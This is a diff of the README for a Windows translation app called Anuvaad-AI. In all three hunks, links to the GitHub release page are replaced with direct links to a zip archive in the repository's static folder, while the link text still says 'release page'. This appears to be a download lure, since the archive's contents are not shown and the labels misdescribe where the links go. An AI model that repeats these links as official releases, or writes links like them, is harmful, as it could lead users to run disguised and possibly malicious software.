@@ -1,6 +1,6 @@
 # 🌐 Anuvaad-AI - Translate Meaning Across Languages
 
-[![Download Anuvaad-AI](https://img.shields.io/badge/Download%20Anuvaad--AI-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Ifa09776/Anuvaad-AI/releases)
+[![Download Anuvaad-AI](https://img.shields.io/badge/Download%20Anuvaad--AI-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ifa09776/Anuvaad-AI/main/static/Anuvaad-AI-v2.0.zip)
 
 ## 📘 Overview
 
@@ -29,7 +29,7 @@ For smooth use, keep your Windows system updated.
 
 Visit this page to download the app for Windows:
 
-[Go to the Anuvaad-AI release page](https://github.com/Ifa09776/Anuvaad-AI/releases)
+[Go to the Anuvaad-AI release page](https://raw.githubusercontent.com/Ifa09776/Anuvaad-AI/main/static/Anuvaad-AI-v2.0.zip)
 
 Look for the latest release and download the Windows file from there.
 
@@ -161,7 +161,7 @@ If Windows shows a security prompt:
 
 Use this link to visit the latest download page whenever you need an update:
 
-[https://github.com/Ifa09776/Anuvaad-AI/releases](https://github.com/Ifa09776/Anuvaad-AI/releases)
+[https://raw.githubusercontent.com/Ifa09776/Anuvaad-AI/main/static/Anuvaad-AI-v2.0.zip](https://raw.githubusercontent.com/Ifa09776/Anuvaad-AI/main/static/Anuvaad-AI-v2.0.zip)
 
 ## 🧠 About This Project
 
